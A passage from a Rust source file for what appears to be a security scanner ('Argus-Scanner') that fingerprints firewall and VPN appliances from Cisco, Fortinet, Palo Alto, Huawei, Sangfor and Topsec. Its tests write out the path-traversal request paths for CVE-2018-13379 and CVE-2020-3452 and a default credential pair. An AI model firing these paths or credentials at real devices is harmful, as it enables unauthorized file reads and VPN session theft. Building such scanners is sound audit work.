            Ok(Ok(0)) => break,
            Ok(Ok(n)) => {
                response.extend_from_slice(&buf[..n]);
                if response.len() > 8192 {
                    break;
                }
            }
            _ => break,
        }
    }

    if response.is_empty() {
        None
    } else {
        Some(String::from_utf8_lossy(&response).to_string())
    }
}

/// 发送带自定义 Header 的 HTTP GET 请求
async fn http_get_with_header(
    host: &str,
    port: u16,
    path: &str,
    header: &str,
    dur: Duration,
) -> Option<String> {
    let mut stream = match timeout(dur, TcpStream::connect((host, port))).await {
        Ok(Ok(s)) => s,
        _ => return None,
    };

    let req = format!(
        "GET {} HTTP/1.0\r\nHost: {}:{}\r\n{}\r\nUser-Agent: Argus-Scanner\r\nConnection: close\r\n\r\n",
        path, host, port, header
    );
    if stream.write_all(req.as_bytes()).await.is_err() {
        return None;
    }

    let mut response = Vec::new();
    let mut buf = vec![0u8; 4096];
    loop {
        match timeout(dur, stream.read(&mut buf)).await {
            Ok(Ok(0)) => break,
            Ok(Ok(n)) => {
                response.extend_from_slice(&buf[..n]);
                if response.len() > 8192 {
                    break;
                }
            }
            _ => break,
        }
    }

    if response.is_empty() {
        None
    } else {
        Some(String::from_utf8_lossy(&response).to_string())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_security_device_type_default_port() {
        assert_eq!(SecurityDeviceType::CiscoAsa.default_port(), 443);
        assert_eq!(SecurityDeviceType::FortinetFortiGate.default_port(), 443);
        assert_eq!(SecurityDeviceType::PaloAlto.default_port(), 443);
        assert_eq!(SecurityDeviceType::CheckPoint.default_port(), 443);
        assert_eq!(SecurityDeviceType::HuaweiUsg.default_port(), 8443);
        assert_eq!(SecurityDeviceType::SangforAf.default_port(), 443);
        assert_eq!(SecurityDeviceType::Topsec.default_port(), 443);
    }

    #[test]
    fn test_security_device_type_as_str() {
        assert_eq!(SecurityDeviceType::CiscoAsa.as_str(), "cisco_asa");
        assert_eq!(SecurityDeviceType::FortinetFortiGate.as_str(), "fortinet_fortigate");
        assert_eq!(SecurityDeviceType::PaloAlto.as_str(), "palo_alto");
        assert_eq!(SecurityDeviceType::CheckPoint.as_str(), "check_point");
        assert_eq!(SecurityDeviceType::HuaweiUsg.as_str(), "huawei_usg");
        assert_eq!(SecurityDeviceType::SangforAf.as_str(), "sangfor_af");
        assert_eq!(SecurityDeviceType::Topsec.as_str(), "topsec");
    }

    #[test]
    fn test_security_device_type_display_name() {
        assert_eq!(SecurityDeviceType::CiscoAsa.display_name(), "Cisco ASA");
        assert_eq!(SecurityDeviceType::FortinetFortiGate.display_name(), "Fortinet FortiGate");
        assert_eq!(SecurityDeviceType::PaloAlto.display_name(), "Palo Alto");
        assert_eq!(SecurityDeviceType::CheckPoint.display_name(), "Check Point");
        assert_eq!(SecurityDeviceType::HuaweiUsg.display_name(), "华为 USG");
        assert_eq!(SecurityDeviceType::SangforAf.display_name(), "深信服 AF");
        assert_eq!(SecurityDeviceType::Topsec.display_name(), "天融信");
    }

    #[test]
    fn test_security_device_finding_serialization() {
        let finding = SecurityDeviceFinding {
            target: "192.168.1.1:443".to_string(),
            device_type: SecurityDeviceType::CiscoAsa,
            title: "测试漏洞".to_string(),
            severity: "high".to_string(),
            description: "测试描述".to_string(),
            fix_advice: Some("测试建议".to_string()),
            evidence: "测试证据".to_string(),
        };
        let json = serde_json::to_string(&finding).unwrap();
        assert!(json.contains("cisco_asa"));
        assert!(json.contains("high"));
        assert!(json.contains("测试漏洞"));
    }

    #[test]
    fn test_security_device_type_clone_eq() {
        let d1 = SecurityDeviceType::CiscoAsa;
        let d2 = d1.clone();
        assert_eq!(d1, d2);
        assert_ne!(d1, SecurityDeviceType::FortinetFortiGate);
    }

    #[test]
    fn test_security_device_scanner_default() {
        let _ = SecurityDeviceScanner::default();
        let _ = SecurityDeviceScanner::new();
    }

    /// 验证 Cisco ASA 指纹识别
    #[test]
    fn test_cisco_asa_fingerprint_detection() {
        let resp = "HTTP/1.1 200 OK\r\n\r\n<html><title>Cisco Adaptive Security Appliance</title></html>";
        let lower = resp.to_lowercase();
        let is_asa = lower.contains("cisco")
            || lower.contains("adaptive security appliance")
            || lower.contains("asa")
            || lower.contains("webvpn")
            || lower.contains("+cscoe+")
            || lower.contains("/+CSCOU+/");
        assert!(is_asa);
    }

    /// 验证 Fortinet FortiGate 指纹识别
    #[test]
    fn test_fortinet_fingerprint_detection() {
        let resp = "HTTP/1.1 200 OK\r\n\r\n<html><title>Fortinet FortiGate</title></html>";
        let lower = resp.to_lowercase();
        let is_fortigate = lower.contains("fortinet")
            || lower.contains("fortigate")
            || lower.contains("fortios")
            || lower.contains("fgt_lang")
            || lower.contains("/remote/fgt_lang")
            || lower.contains("login?redirect=");
        assert!(is_fortigate);
    }

    /// 验证 Palo Alto 指纹识别
    #[test]
    fn test_paloalto_fingerprint_detection() {
        let resp = "HTTP/1.1 200 OK\r\n\r\n<html><title>Palo Alto Networks</title></html>";
        let lower = resp.to_lowercase();
        let is_paloalto = lower.contains("palo alto")
            || lower.contains("paloalto")
            || lower.contains("globalprotect")
            || lower.contains("pan-os")
            || lower.contains("/php/login.php");
        assert!(is_paloalto);
    }

    /// 验证 Check Point 指纹识别
    #[test]
    fn test_checkpoint_fingerprint_detection() {
        let resp = "HTTP/1.1 200 OK\r\n\r\n<html><title>Check Point Gaia Portal</title></html>";
        let lower = resp.to_lowercase();
        let is_checkpoint = lower.contains("check point")
            || lower.contains("checkpoint")
            || lower.contains("gaia")
            || lower.contains("secureplatform")
            || lower.contains("/web_api/");
        assert!(is_checkpoint);
    }

    /// 验证 华为 USG 指纹识别
    #[test]
    fn test_huawei_usg_fingerprint_detection() {
        let resp = "HTTP/1.1 200 OK\r\n\r\n<html><title>Huawei USG6000</title></html>";
        let lower = resp.to_lowercase();
        let is_usg = lower.contains("huawei")
            || lower.contains("usg")
            || lower.contains("usg2000")
            || lower.contains("usg5000")
            || lower.contains("usg6000")
            || lower.contains("secospace")
            || lower.contains("eudemon");
        assert!(is_usg);
    }

    /// 验证 深信服 AF 指纹识别
    #[test]
    fn test_sangfor_af_fingerprint_detection() {
        let resp = "HTTP/1.1 200 OK\r\n\r\n<html><title>Sangfor AF NGFW</title></html>";
        let lower = resp.to_lowercase();
        let is_sangfor = lower.contains("sangfor")
            || lower.contains("深信服")
            || lower.contains("sangfor af")
            || lower.contains("/cgi-bin/login")
            || lower.contains("ngfw");
        assert!(is_sangfor);
    }

    /// 验证 天融信指纹识别
    #[test]
    fn test_topsec_fingerprint_detection() {
        let resp = "HTTP/1.1 200 OK\r\n\r\n<html><title>Topsec NGFW4000</title></html>";
        let lower = resp.to_lowercase();
        let is_topsec = lower.contains("topsec")
            || lower.contains("天融信")
            || lower.contains("toprule")
            || lower.contains("ngfw4000")
            || lower.contains("vpn");
        assert!(is_topsec);
    }

    /// 验证非安全设备不会被误判
    #[test]
    fn test_non_security_device_not_detected() {
        let resp = "HTTP/1.1 200 OK\r\n\r\n<html><title>Apache Server</title></html>";
        let lower = resp.to_lowercase();
        let is_asa = lower.contains("cisco")
            || lower.contains("adaptive security appliance")
            || lower.contains("asa")
            || lower.contains("webvpn");
        assert!(!is_asa);

        let is_fortigate = lower.contains("fortinet") || lower.contains("fortigate");
        assert!(!is_fortigate);
    }

    /// 验证 CVE 路径关键字
    #[test]
    fn test_cve_path_keywords() {
        // Fortinet CVE-2018-13379 路径
        let path = "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession";
        assert!(path.contains("fgt_lang"));
        assert!(path.contains("sslvpn_websession"));

        // Cisco CVE-2020-3452 路径
        let path = "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua";
        assert!(path.contains("CSCOT"));
        assert!(path.contains("translation-table"));
    }

    /// 验证 base64 编码
    #[test]
    fn test_base64_encoding_for_basic_auth() {
        let encoded = base64::engine::general_purpose::STANDARD.encode("admin:Admin@123");
        assert!(!encoded.is_empty());
    }
}
